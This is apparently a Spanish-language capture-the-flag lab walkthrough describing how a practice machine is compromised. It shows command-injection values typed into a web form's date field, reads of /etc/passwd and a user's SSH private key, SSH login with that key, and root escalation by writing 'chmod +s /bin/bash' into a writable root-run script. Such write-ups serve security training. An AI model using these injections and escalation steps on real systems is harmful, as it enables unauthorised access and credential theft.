PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos a la web y vemos una funcionalidad para crear reportes con los siguientes campos:
	-Nombre del Archivo:
	-Fecha (YYYY-MM-DD):

-Puede ser que en el campo fecha se esté aplicando un comando por detrás para determinar la fecha , podemos abusar de esto mediante 'Command Injection' para saltarnos la validación y ejecutar cualquier comando en el servidor:
	-Nombre del Archivo: test
	-Fecha (YYYY-MM-DD):  ;id


-Reportes Generados:
	Reporte: reporte_1739288559.txt
	Archivo de reporte: /var/www/html/reportes/reporte_1739288559.txt
	Nombre: test
	Fecha: \
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

-No consigo mandarme una reverse shell directamente, tampoco tiene instalado el comando curl , tampoco funciona descargando un exploit con wget

-Parece que la shell no es del todo interactiva y no permite ejecutar archivos con bash

-Leemos el /etc/passwd y encontramos el usuario samara:
	-Fecha:  ;cat /etc/passwd
	samara:x:1001:1001:samara,,,:/home/samara:/bin/bash

-Probamos a leer la id_rsa en su directorio:
	-Fecha:  ;cat /home/samara/.ssh/id_rsa
	-Contenido: Podemos leer la id_rsa!!!

-Le damos los permisos y nos autenticamos por ssh con la clave privada:
	-chmod 0400 id_rsa
	-ssh -i id_rsa samara@172.17.0.2
	samara@bf88edef501a:~$ 

## Escalada de Privilegios

-No podemos ejecutar comandos como sudo, tampoco encontramos binatios SUID interesantes

-Miramos los procesos que están corriendo en la máquina:
	-ps -faux
	-El usuario root está ejecutando la siguiente tarea CRON:
		/bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done

-Miramos los permisos que tenemos en '/usr/local/bin/echo.sh':
	-rwxrw-rw- 1 root root 101 Feb 11 17:31 /usr/local/bin/echo.sh
	-Tenemos permisos de escritura!!

-Escribimos la siguiente línea en '/usr/local/bin/echo.sh'
	-chmod +s /bin/bash

-Esperamos a que root ejecuta la tarea y... :
	-samara@bf88edef501a:~$ ls -l /bin/bash
	-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash

-Elevamos nuestra shell a root:
	samara@bf88edef501a:~$ bash -p
	bash-5.2# whoami
	root

